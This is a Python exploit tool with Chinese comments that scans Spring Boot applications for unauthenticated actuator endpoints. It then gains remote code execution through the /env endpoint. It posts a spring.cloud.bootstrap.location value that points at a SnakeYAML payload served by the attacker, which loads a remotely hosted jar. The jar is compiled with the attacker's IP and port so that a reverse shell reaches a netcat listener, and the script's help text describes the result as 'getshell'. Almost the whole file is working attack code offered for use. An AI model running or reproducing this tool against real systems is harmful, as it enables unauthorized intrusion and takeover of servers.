#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
import argparse
import os
import re
import requests
import multiprocessing
import time
from http.server import SimpleHTTPRequestHandler,HTTPServer
import logging
banner = r'''                _
                 _
 ___ _ __  _ __(_)_ __   __ _        _____  ___ __
/ __| '_ \| '__| | '_ \ / _` |_____ / _ \ \/ / '_ \
\__ \ |_) | |  | | | | | (_| |_____|  __/>  <| |_) |
|___/ .__/|_|  |_|_| |_|\__, |      \___/_/\_\ .__/
    |_|                 |___/                |_|
-------Spring Boot 2.x 无法利用成功---------
-------Spring Boot 1.5.x 在使用 Dalston 版本时可利用成功，使用 Edgware 无法成功--------
-------Spring Boot <= 1.4 可利用成功---------------
                          --by tea0 '''
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", }

pathlist = ['/autoconfig', '/beans', '/env', '/configprops', '/dump', '/health', '/info', '/mappings', '/metrics',
            '/shutdown', '/trace', ]
nc_ip = ""
nc_port = ""


def save_result(result, url):
    if result:
        fw = open('./output/{}.txt'.format("".join(re.findall(r'\d+.\d+.\d+.\d+', url))), 'a')
        fw.write(result + '\n')
        fw.close()


def actuator_scan(url):
    key = 0
    for i in pathlist:
        url_tar = url + i
        r = requests.get(url_tar, headers=headers, verify=False)
        if r.status_code == 200:
            print("目标站点开启了 {} 端点的未授权访问,路径为：{}".format(i.replace('/', ''), url_tar))
            save_result("目标站点开启了 {} 端点的未授权访问,路径为：{}".format(i.replace('/', ''), url_tar), url)
            if i == "/env":
                key = 2
    return key


def check_url(ip):
    url = str(ip)
    try:
        r = requests.get(url + '/404', headers=headers, timeout=10, verify=False)
        if r.status_code == 404 or r.status_code == 403:
            if 'Whitelabel Error Page' in r.text or 'There was an unexpected error' in r.text:
                print("It's A Spring Boot Web APP: {}".format(url))
                save_result("It's A Spring Boot Web APP: {}".format(url), url)
                key = actuator_scan(url)
                return key
    except requests.exceptions.ConnectTimeout:
        return 0.0
    except requests.exceptions.ConnectionError:
        return 0.1


def run_server(url):
    os.chdir("./server")
    server_address = ('', int(nc_port)+1)
    try:
        httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
        httpd.serve_forever()
    except Exception as e:
        httpd.shutdown()


# os.system("python -m http.server 2000 >result.txt&")
def mk_rerverse_file():
    yml_str = '''
            !!javax.script.ScriptEngineManager [
          !!java.net.URLClassLoader [[
            !!java.net.URL ["http://{}:{}/yaml-payload.jar"]
          ]]
        ]
    '''.format(nc_ip,int(nc_port)+1)
    with open('./server/yaml-payload.yml', 'w') as file:
        file.write(yml_str)
    with open('./yaml-payload/src/artsploit/poc.java', 'r') as file:
        text = file.read()
        tex2 = text.replace('ncip', nc_ip).replace('ncport', nc_port)
        with open('./yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java', 'w') as file:
            file.write(tex2)
    os.popen("javac ./yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java")
    os.popen("jar -cvf ./server/yaml-payload.jar -C ./yaml-payload/src/ .")
    return nc_ip


def exploiet(url):
    ip = mk_rerverse_file()
    #
    data = {
        'spring.cloud.bootstrap.location': 'http://{}:{}/yaml-payload.yml'.format(ip,int(nc_port)+1)
    }
    r = requests.post(url + '/env', headers=headers, data=data)
    if 'spring.cloud.bootstrap.location' in r.text:
        print("远程加载外部文件成功")
        child_process = multiprocessing.Process(target=run_server, args=(url,))

        child_process.start()
        time.sleep(5)
        r = requests.post(url + '/refresh',headers=headers)



if __name__ == '__main__':
    print(banner)
    parser = argparse.ArgumentParser(description="获取帮助")
    parser.add_argument("-u", "--url", dest='url', help=" 目标url连接")
    parser.add_argument("-exp", dest='exp', help="请先在网站监听命令如下：nc -lvvp 200 ;-exp 106.15.94.206")
    parser.add_argument('-p', dest='port', help="外网端口")
    args = parser.parse_args()
    if args.exp !=None:
        nc_ip = args.exp
        nc_port = args.port
        print("ok")
        exploiet(args.url)
    elif  args.url:
        res = check_url(args.url)
        if res == 1:
            print("目标存在其他利用方式，本脚本暂不支持")
        elif res == 0.0:
            print("与目标网络连接异常，timeout默认为10s，请根据网络环境自行更改")
        elif res == 0.1:
            print("与目标网络连接异常，目标计算机积极拒绝，无法连接")
        elif res == 2:
            print("目标key继续利用，可getshell，如利用请加-exp -p")
        else:
            print("目标未使用spring boot或本脚本识别模块不够完善，如为后者欢迎反馈Issue")